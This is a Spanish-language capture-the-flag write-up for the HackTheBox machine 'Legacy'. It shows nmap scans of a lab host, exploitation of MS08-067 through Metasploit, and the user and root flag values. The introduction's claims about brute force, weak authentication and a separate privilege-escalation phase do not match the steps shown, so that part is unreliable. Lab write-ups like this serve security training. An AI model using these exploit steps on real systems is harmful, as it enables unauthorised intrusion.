-- --
- Tags: #ejptmachine #metasploit #eternalblue #rce 
--- --
### ¿Qué habilidades puedes practicar con Legacy?

1. **Reconocimiento y escaneo de puertos:**
    - La máquina comienza con un escaneo de puertos utilizando herramientas como **Nmap**, lo que te permitirá identificar los servicios y puertos abiertos. Este es un paso crucial en la práctica del pentesting y en el proceso de preparación para la **eJPTv2**.
2. **Enumeración de servicios Windows:**
    - En **Legacy**, te enfrentarás a un servicio **SMB** vulnerable en un sistema Windows, lo que te permite practicar la **enumeración de servicios SMB**, una habilidad clave en el reconocimiento de sistemas Windows.
    - Aprenderás cómo interactuar con **NetBIOS** y cómo obtener información de las posibles credenciales mediante técnicas de **brute force** o **creación de credenciales predeterminadas**.
3. **Explotación de vulnerabilidades:**
    - **Legacy** hace énfasis en un sistema Windows vulnerable donde deberás explotar un servicio **SMB** y aprovechar la **autenticación débil** para obtener acceso inicial al sistema.
    - Este proceso es muy útil para aprender sobre vulnerabilidades relacionadas con configuraciones incorrectas de **Windows** y es algo común en las pruebas de penetración en sistemas de Windows.
4. **Escalada de privilegios en Windows:**
    - Después de obtener acceso inicial, el siguiente paso es realizar una **escalada de privilegios**. En este caso, deberás explorar los sistemas de archivos y configuraciones en Windows para encontrar **contraseñas almacenadas** o **otros vectores de escalada** que te permitan obtener privilegios más altos, como **Administrador** o **SYSTEM**.
---

`nmap -p- --open -sC -sV --min-rate 5000 -n -vvv -oN Portscan 10.10.10.4`
![Pasted image 20241124001327](../../Fotos/Pasted%20image%2020241124001327.png)
![Pasted image 20241124001343](../../Fotos/Pasted%20image%2020241124001343.png)

`nmap --script vuln -p445 10.10.10.4`
![Pasted image 20241124001655](../../Fotos/Pasted%20image%2020241124001655.png)
![Pasted image 20241124001704](../../Fotos/Pasted%20image%2020241124001704.png)
- Microsoft Windows system vulnerable to remote code execution (MS08-067)
- CVE:CVE-2008-4250

`msfconsole`
search CVE:CVE-2008-4250
use 0
![Pasted image 20241124001958](../../Fotos/Pasted%20image%2020241124001958.png)

`set RHOSTS 10.10.10.4`
- LHOST : ip interfaz con la que tenemos conectividad
![Pasted image 20241124002224](../../Fotos/Pasted%20image%2020241124002224.png)

User Flag: e69af0e4f443de7e36876fda4ec7644f
Root Flag: 993442d258b0e0ec917cae9e695d5713

![Pasted image 20241124141719](../../Fotos/Pasted%20image%2020241124141719.png)

![Pasted image 20241124141736](../../Fotos/Pasted%20image%2020241124141736.png)

`Maquina Vulnerada`


``
``




